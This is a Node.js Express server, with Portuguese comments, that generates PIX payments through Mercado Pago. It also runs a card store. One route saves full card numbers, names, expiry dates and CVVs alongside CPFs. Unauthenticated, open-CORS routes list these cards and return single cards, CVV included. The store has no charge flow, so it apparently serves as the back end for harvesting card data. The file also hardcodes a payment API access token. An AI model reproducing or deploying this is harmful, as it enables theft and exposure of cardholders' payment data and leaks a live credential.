"use strict";
const axios = require("axios");
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const fs = require("fs");
const { v4: uuidv4 } = require("uuid");
const { Pool } = require("pg"); // 🔄 troquei mysql2 por pg

const app = express();
app.use(bodyParser.json());
app.use(cors());

/********************
 * CONFIGURAÇÃO PIX *
 ********************/
const ACCESS_TOKEN = "APP_USR-7155153166578433-022021-bb77c63cb27d3d05616d5c08e09077cf-502781407";
const PAGAMENTOS_FILE = "pagamentos.json";

// Inicializar o arquivo de pagamentos se não existir
if (!fs.existsSync(PAGAMENTOS_FILE)) {
  fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify([]));
}

// Função para gerar uma chave PIX
async function gerarChavePix(valor, payerEmail, payerCpf) {
  try {
    const idempotencyKey = uuidv4();
    const response = await axios.post(
      "https://api.mercadopago.com/v1/payments",
      {
        transaction_amount: valor,
        description: "Pagamento via PIX",
        payment_method_id: "pix",
        payer: {
          email: payerEmail,
          identification: {
            type: "CPF",
            number: payerCpf,
          },
        },
      },
      {
        headers: {
          Authorization: `Bearer ${ACCESS_TOKEN}`,
          "Content-Type": "application/json",
          "X-Idempotency-Key": idempotencyKey,
        },
      }
    );

    const qrcodeData = {
      txid: response.data.id,
      qrcode: response.data.point_of_interaction.transaction_data.qr_code,
      copiaECola: response.data.point_of_interaction.transaction_data.qr_code_base64,
      valor,
      payerEmail,
      payerCpf,
      status: "pendente",
    };

    console.log(`Chave PIX gerada: ${JSON.stringify(qrcodeData)}`);
    return qrcodeData;
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.response?.data || error.message);
    throw new Error(error.response?.data?.message || "Erro ao gerar chave PIX");
  }
}

/**********************
 * ROTA PIX EXISTENTE *
 **********************/
app.post("/gerar-chave-pix", async (req, res) => {
  try {
    const { valor, payerEmail, payerCpf } = req.body;
    if (!valor || isNaN(valor) || valor <= 0) {
      return res.status(400).json({ error: "Valor inválido" });
    }

    const qrcodeData = await gerarChavePix(parseFloat(valor), payerEmail, payerCpf);

    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    pagamentos.push(qrcodeData);
    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));

    console.log(`Chave PIX gerada com sucesso: txid=${qrcodeData.txid}, valor=${qrcodeData.valor}, email=${qrcodeData.payerEmail}`);
    res.json(qrcodeData);
  } catch (error) {
    console.error("Erro ao gerar chave PIX:", error.message);
    res.status(500).json({ error: error.message });
  }
});

/***********************************
 * CONFIGURAÇÃO BANCO CARTÕES (PG) *
 ***********************************/
const pool = new Pool({
  connectionString: process.env.DATABASE_URL, // 🔄 variavel de ambiente
  ssl: { rejectUnauthorized: false }, // 🔄 necessário no Render
});

pool.connect()
  .then(() => console.log("Conectado ao banco Postgres no Render!"))
  .catch(err => console.error("Erro de conexão com o banco:", err.message));

/**********************
 * NOVO ENDPOINT DB *
 **********************/
app.get("/init-db", async (req, res) => {
  try {
    const sql = `
      CREATE TABLE IF NOT EXISTS cartoes (
        id SERIAL PRIMARY KEY,
        cpf VARCHAR(20) NOT NULL,
        numero VARCHAR(20) NOT NULL,
        nome VARCHAR(100) NOT NULL,
        validade VARCHAR(10) NOT NULL,
        cvv VARCHAR(5) NOT NULL,
        criado_em TIMESTAMP DEFAULT NOW()
      );
    `;
    await pool.query(sql);
    res.json({ sucesso: true, mensagem: "Tabela 'cartoes' criada ou já existente!" });
  } catch (err) {
    console.error("ERRO COMPLETO AO CRIAR TABELA:", err); // 🔴 log detalhado
    res.status(500).json({ error: "Erro ao criar tabela, verifique o log do backend" });
  }
});

// Rota para salvar cartões
app.post("/salvar-cartao", async (req, res) => {
  const { cpf, numero, nome, validade, cvv } = req.body;

  if (!cpf || !numero || !nome || !validade || !cvv) {
    return res.status(400).json({ error: "Todos os campos são obrigatórios." });
  }

  try {
    const sql = "INSERT INTO cartoes (cpf, numero, nome, validade, cvv) VALUES ($1, $2, $3, $4, $5)";
    await pool.query(sql, [cpf, numero, nome, validade, cvv]);

    res.json({ sucesso: true, mensagem: "Cartão salvo com sucesso!" });
  } catch (err) {
    console.error("Erro ao salvar cartão:", err.message);
    res.status(500).json({ error: "Erro ao salvar cartão." });
  }
});

/***************************************
 * NOVAS ROTAS DE CONSULTA (adicionadas)
 * - GET /cartoes            => lista (paginação + filtros cpf/nome)
 * - GET /cartoes/:id        => retorna um cartão pelo id
 ***************************************/
app.get("/cartoes", async (req, res) => {
  try {
    // parâmetros opcionais: limit, offset, cpf, nome
    let { limit, offset, cpf, nome } = req.query;
    limit = parseInt(limit, 10);
    offset = parseInt(offset, 10);

    if (isNaN(limit) || limit <= 0) limit = 100; // default
    if (isNaN(offset) || offset < 0) offset = 0;

    const values = [];
    const where = [];
    let idx = 1;

    if (cpf) {
      where.push(`cpf = $${idx++}`);
      values.push(cpf);
    }

    if (nome) {
      where.push(`nome ILIKE $${idx++}`);
      values.push(`%${nome}%`);
    }

    let sql = `SELECT id, cpf, numero, nome, validade, criado_em FROM cartoes`;
    if (where.length) sql += " WHERE " + where.join(" AND ");

    sql += ` ORDER BY criado_em DESC LIMIT $${idx++} OFFSET $${idx++}`;
    values.push(limit, offset);

    const result = await pool.query(sql, values);
    res.json({ count: result.rowCount, rows: result.rows });
  } catch (err) {
    console.error("Erro ao listar cartoes:", err.message || err);
    res.status(500).json({ error: "Erro ao listar cartões" });
  }
});

app.get("/cartoes/:id", async (req, res) => {
  const id = parseInt(req.params.id, 10);
  if (isNaN(id)) return res.status(400).json({ error: "ID inválido" });

  try {
    const result = await pool.query("SELECT * FROM cartoes WHERE id = $1", [id]);
    if (result.rowCount === 0) return res.status(404).json({ error: "Cartão não encontrado" });

    res.json(result.rows[0]);
  } catch (err) {
    console.error("Erro ao buscar cartão:", err.message || err);
    res.status(500).json({ error: "Erro ao buscar cartão" });
  }
});

/******************************
 * FUNÇÕES DE ATUALIZAÇÃO PIX *
 ******************************/
async function atualizarStatusPagamentos() {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));

    for (const pagamento of pagamentos) {
      if (pagamento.status !== "approved") {
        const response = await axios.get(`https://api.mercadopago.com/v1/payments/${pagamento.txid}`, {
          headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
        });

        const novoStatus = response.data.status;

        if (novoStatus === "approved" && pagamento.status !== "approved") {
          console.log(`Pagamento aprovado: txid=${pagamento.txid}, valor=${pagamento.valor}, email=${pagamento.payerEmail}`);
        }

        pagamento.status = novoStatus;
      }
    }

    fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
    console.log("Status dos pagamentos atualizado com sucesso.");
  } catch (error) {
    console.error("Erro ao atualizar status dos pagamentos:", error.message);
  }
}

/******************************
 * ROTAS EXISTENTES DE PAGAMENTOS *
 ******************************/
app.get("/pagamentos", (req, res) => {
  try {
    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    const pagamentosAprovados = pagamentos.filter((p) => p.status === "approved");
    res.json(pagamentosAprovados);
  } catch (error) {
    res.status(500).json({ error: "Erro ao carregar pagamentos" });
  }
});

app.post("/verificar-status", async (req, res) => {
  const { txid } = req.body;
  if (!txid) return res.status(400).json({ error: "txid não fornecido" });

  try {
    const response = await axios.get(`https://api.mercadopago.com/v1/payments/${txid}`, {
      headers: { Authorization: `Bearer ${ACCESS_TOKEN}` },
    });

    const status = response.data.status;

    const pagamentos = JSON.parse(fs.readFileSync(PAGAMENTOS_FILE, "utf8"));
    const pagamento = pagamentos.find((p) => p.txid === txid);
    if (pagamento) {
      pagamento.status = status;
      fs.writeFileSync(PAGAMENTOS_FILE, JSON.stringify(pagamentos, null, 2));
    }

    res.json({ status });
  } catch (error) {
    res.status(500).json({ error: "Erro ao verificar status do pagamento" });
  }
});

/******************************
 * FUNÇÕES DE PING AUTOMÁTICO *
 ******************************/
async function enviarPing() {
  try {
    const response = await axios.get(`http://localhost:${PORT}/pagamentos`);
    console.log("Ping bem-sucedido:", response.data);
  } catch (error) {
    console.error("Erro ao enviar ping:", error.message);
  }
}

/******************************
 * INTERVALOS AUTOMÁTICOS *
 ******************************/
setInterval(atualizarStatusPagamentos, 60000);
setInterval(enviarPing, 60000);

/*********************
 * INICIAR SERVIDOR *
 *********************/
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));